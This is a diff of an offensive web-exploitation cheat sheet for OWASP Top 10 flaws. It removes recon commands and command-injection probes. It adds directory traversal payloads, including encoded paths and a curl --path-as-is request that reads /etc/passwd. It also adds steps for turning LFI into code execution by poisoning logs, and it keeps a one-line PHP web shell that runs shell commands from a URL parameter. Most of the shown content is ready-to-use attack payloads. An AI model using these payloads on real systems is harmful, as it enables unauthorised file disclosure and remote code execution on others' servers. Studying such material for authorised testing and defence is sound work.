@@ -4,62 +4,19 @@ This is a cheat sheet for exploitation of OWASP Top 10.
 
 It is the followed by more refined attacks. 
 
-# Frist things to do
+## Directory traversal
 
-1. run nikto: vulnerability scan
-2. gobuster dir: find hidden directories
-`gobuster dns -u google.com -w wordlist.txt`
-3. dobuster dns: enumerate subdomains
-`gobuster dns -d google.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt`
-4. use nmap scripts 
+Find parameters vulnerable to `../`
 
-```bash
-ls /usr/share/nmap/scripts | grep http
-nmap -p80,443 --script "http-*" $victim_ip
-````
+You may need to bypass WAF
 
-# OWASP Top 10
+`http://localhost/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd`
 
-## Command Injection
+Or to provide path as is 
 
-If Backend has an insecure function that passes user input directly to shell, it can be exploited.
+`curl --path-as-is http://localhost:3000/public/plugins/alertlist/../../../../../../../../etc/passwd`
 
-Try injecting the following:
-```
-# Linux
-
-whoami
-id
-ifconfig/ip addr
-uname -a
-ps -ef
-
-
-# Windows
-
-whoami
-ver
-ipconfig
-tasklist
-netstat -an
-```
-
-For bypassing WAF and more advanced injections your best friend is as always: Payload all the thins.
-
-## Broken Authentication
-
-If an attacker is able to find flaws in an authentication mechanism, they would then successfully gain access to other users’ accounts.
-
-1. Try manipulating session cookies to see if they are predictable
-2. Manipulate GET requests containing IDs or usernames
-3. Register as user with similar name: add space " admin" or numbers
-
-## Sensitive Data Exposure
-
-1. Search web source code
-2. Dirbust for hidden files
-3. Dork with Google or Github
-4. Try downloading db files with command injection
+Enjoy reading sensitive information.
 
 ## XXE injection
 
@@ -202,7 +159,10 @@ Fuzzing for POST requests
 
 ## LFI
 
-If it is possible to access servers files using web requests then get RCE with remote logs contamination
+* detect directory traversal and attempt LFI to get RCE!
+* LFI allows executing files (not reading!)
+* modify and contaminate some log file
+* use LFI to trigger contaminated file
 
 1. Contaminate Logs
 ` <?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?> `
